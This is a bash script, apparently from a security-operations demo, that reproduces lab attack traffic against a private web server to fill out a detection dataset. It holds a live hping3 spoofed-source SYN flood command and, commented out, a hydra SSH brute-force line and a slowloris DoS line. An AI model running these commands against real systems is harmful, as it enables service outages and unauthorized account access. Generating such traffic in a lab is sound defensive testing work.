#!/bin/bash
# =====================================================================
# AI-SOC DEMO — DAY 4 (2026-04-23)
# Phase   : External DDoS burst (NOT from .23 — unrelated incident)
# Source  : ~60 spoofed external IPs
# Target  : 172.16.16.30 (DMZ web server, port 80)
#
# This is the ONLY DDoS sample in the dataset, included to give the
# "Attack Types" panel coverage for the DDoS ML class. The live demo
# on 25/04 does NOT perform DDoS (single-IP scenario).
#
# Dataset also contains 3 unrelated SSH-Patator events from .25 at
# 11:20 and 3 DoS slowloris probes from .28 at 05:48 — kept commented
# below for audit consistency.
#
# WARNING — DEMO REFERENCE ONLY (not executed live).
# =====================================================================
set -e
WEB="172.16.16.30"

echo "[Day-4 19:42] hping3 spoofed-source SYN flood (≈30 min, ~160 events)"
# Real reconstruction (audit-only). Requires root.
timeout 1800 hping3 -c 160 -d 64 -S -w 64 -p 80 -i u200000 \
  --rand-source "$WEB" >/dev/null 2>&1 || true

# ---- Unrelated SSH-Patator from .25 ----
# timeout 30 hydra -L /tmp/u.txt -P /tmp/p.txt -t 3 -f ssh://${WEB} >/dev/null 2>&1 || true

# ---- Unrelated DoS slowloris from .28 ----
# timeout 270 slowhttptest -c 200 -H -i 10 -r 50 -t GET -u "http://${WEB}" -x 24 -p 3 >/dev/null 2>&1 || true

echo "[Day-4] complete — expected: DDoS ALERT cluster (~160 events, ~60 unique src_ip)"
echo "                + 3× SSH-Patator ALERT (.25) + 3× DoS slowloris ALERT (.28)"
